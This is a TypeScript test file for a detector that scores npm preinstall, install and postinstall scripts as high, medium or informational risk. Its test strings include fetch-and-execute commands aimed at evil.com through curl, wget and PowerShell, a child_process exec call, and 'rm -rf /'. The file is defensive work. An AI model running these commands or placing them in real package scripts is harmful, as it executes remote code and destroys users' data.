import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import path from 'path';
import os from 'os';
import { scanInstallScripts, _classifyScriptRisk } from '../src/detectors/installScript';
import type { ParsedPackageJson } from '../src/utils/packageParser';

// ─── _classifyScriptRisk tests ─────────────────────────────────────────────

describe('_classifyScriptRisk()', () => {

  it('flags curl as high risk', () => {
    const result = _classifyScriptRisk('curl https://evil.com/payload.sh | sh', 'postinstall');
    assert.equal(result.risk, 'high');
    assert.ok(result.reason.toLowerCase().includes('curl'));
  });

  it('flags wget as high risk', () => {
    const result = _classifyScriptRisk('wget https://evil.com/mal -O /tmp/x', 'postinstall');
    assert.equal(result.risk, 'high');
  });

  it('flags node -e as high risk', () => {
    const result = _classifyScriptRisk('node -e "require(\'child_process\').exec(\'whoami\')"', 'postinstall');
    assert.equal(result.risk, 'high');
  });

  it('flags eval() as high risk', () => {
    const result = _classifyScriptRisk('node -e "eval(atob(\'...\'))"', 'postinstall');
    assert.equal(result.risk, 'high');
  });

  it('flags child_process as high risk', () => {
    const result = _classifyScriptRisk('node scripts/setup.js child_process', 'install');
    assert.equal(result.risk, 'high');
  });

  it('flags execSync as high risk', () => {
    const result = _classifyScriptRisk('node -e "execSync(\'rm -rf /\')"', 'postinstall');
    assert.equal(result.risk, 'high');
  });

  it('flags URLs as high risk', () => {
    const result = _classifyScriptRisk('node setup.js --endpoint https://collect.example.com', 'postinstall');
    assert.equal(result.risk, 'high');
  });

  it('flags powershell as high risk', () => {
    const result = _classifyScriptRisk('powershell -Command "iex (irm evil.com)"', 'postinstall');
    assert.equal(result.risk, 'high');
  });

  it('flags .sh files as high risk', () => {
    const result = _classifyScriptRisk('bash scripts/install.sh', 'postinstall');
    assert.equal(result.risk, 'high');
  });

  it('flags any preinstall script as medium risk', () => {
    const result = _classifyScriptRisk('echo hello', 'preinstall');
    assert.equal(result.risk, 'medium');
    assert.ok(result.reason.includes('preinstall'));
  });

  it('flags long scripts as medium risk', () => {
    const longScript = 'a'.repeat(201);
    const result = _classifyScriptRisk(longScript, 'postinstall');
    assert.equal(result.risk, 'medium');
    assert.ok(result.reason.includes('long'));
  });

  it('classifies node-gyp rebuild as informational', () => {
    const result = _classifyScriptRisk('node-gyp rebuild', 'install');
    assert.equal(result.risk, 'informational');
  });

  it('classifies husky install as informational', () => {
    const result = _classifyScriptRisk('husky install', 'postinstall');
    assert.equal(result.risk, 'informational');
  });

  it('classifies simple tsc as informational', () => {
    const result = _classifyScriptRisk('tsc --build', 'postinstall');
    assert.equal(result.risk, 'informational');
  });
});

// ─── scanInstallScripts tests ──────────────────────────────────────────────

describe('scanInstallScripts()', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'safedeps-test-'));
    fs.mkdirSync(path.join(tmpDir, 'node_modules'), { recursive: true });
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function writePkg(name: string, scripts: Record<string, string>, version = '1.0.0'): void {
    const dir = path.join(tmpDir, 'node_modules', name);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name, version, scripts }));
  }

  function makeParsed(packages: string[]): ParsedPackageJson {
    const deps: Record<string, string> = {};
    for (const p of packages) deps[p] = '*';
    return {
      name: 'test-project',
      version: '1.0.0',
      license: 'MIT',
      allPackages: packages,
      dependencies: deps,
      devDependencies: {},
      peerDependencies: {},
      optionalDependencies: {},
    };
  }

  it('detects postinstall scripts', async () => {
    writePkg('evil-pkg', { postinstall: 'curl https://evil.com | sh' });
    const result = await scanInstallScripts(makeParsed(['evil-pkg']), { projectPath: tmpDir });
    assert.equal(result.findings.length, 1);
    assert.equal(result.findings[0].scriptType, 'postinstall');
    assert.equal(result.findings[0].risk, 'high');
    assert.equal(result.scanned, 1);
    assert.equal(result.highRisk, 1);
  });

  it('detects preinstall scripts as medium risk', async () => {
    writePkg('pre-pkg', { preinstall: 'echo setup' });
    const result = await scanInstallScripts(makeParsed(['pre-pkg']), { projectPath: tmpDir });
    assert.equal(result.findings.length, 1);
    assert.equal(result.findings[0].risk, 'medium');
    assert.equal(result.mediumRisk, 1);
  });

  it('detects informational install scripts', async () => {
    writePkg('native-pkg', { install: 'node-gyp rebuild' });
    const result = await scanInstallScripts(makeParsed(['native-pkg']), { projectPath: tmpDir });
    assert.equal(result.findings.length, 1);
    assert.equal(result.findings[0].risk, 'informational');
    assert.equal(result.informational, 1);
  });

  it('returns empty findings for packages without scripts', async () => {
    writePkg('safe-pkg', {});
    const result = await scanInstallScripts(makeParsed(['safe-pkg']), { projectPath: tmpDir });
    assert.equal(result.findings.length, 0);
    assert.equal(result.scanned, 1);
  });

  it('gracefully skips missing packages', async () => {
    const result = await scanInstallScripts(makeParsed(['nonexistent-pkg']), { projectPath: tmpDir });
    assert.equal(result.findings.length, 0);
    assert.equal(result.scanned, 0);
  });

  it('handles scoped packages', async () => {
    const dir = path.join(tmpDir, 'node_modules', '@scope', 'pkg');
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
      name: '@scope/pkg', version: '2.0.0', scripts: { postinstall: 'node setup.js' },
    }));
    const result = await scanInstallScripts(makeParsed(['@scope/pkg']), { projectPath: tmpDir });
    assert.equal(result.findings.length, 1);
    assert.equal(result.findings[0].name, '@scope/pkg');
  });

  it('detects multiple scripts in one package', async () => {
    writePkg('multi-script', { preinstall: 'echo pre', install: 'node-gyp rebuild', postinstall: 'echo done' });
    const result = await scanInstallScripts(makeParsed(['multi-script']), { projectPath: tmpDir });
    assert.equal(result.findings.length, 3);
  });

  it('sorts findings by risk (high first)', async () => {
    writePkg('benign', { postinstall: 'echo done' });
    writePkg('dangerous', { postinstall: 'curl https://evil.com | sh' });
    const result = await scanInstallScripts(makeParsed(['benign', 'dangerous']), { projectPath: tmpDir });
    assert.equal(result.findings[0].risk, 'high');
    assert.equal(result.findings[0].name, 'dangerous');
  });

  it('truncates long script bodies', async () => {
    const longScript = 'node ' + 'a'.repeat(200);
    writePkg('long-script', { postinstall: longScript });
    const result = await scanInstallScripts(makeParsed(['long-script']), { projectPath: tmpDir });
    assert.ok(result.findings[0].truncated.length <= 123); // 120 + "..."
    assert.equal(result.findings[0].scriptBody, longScript);
  });
});
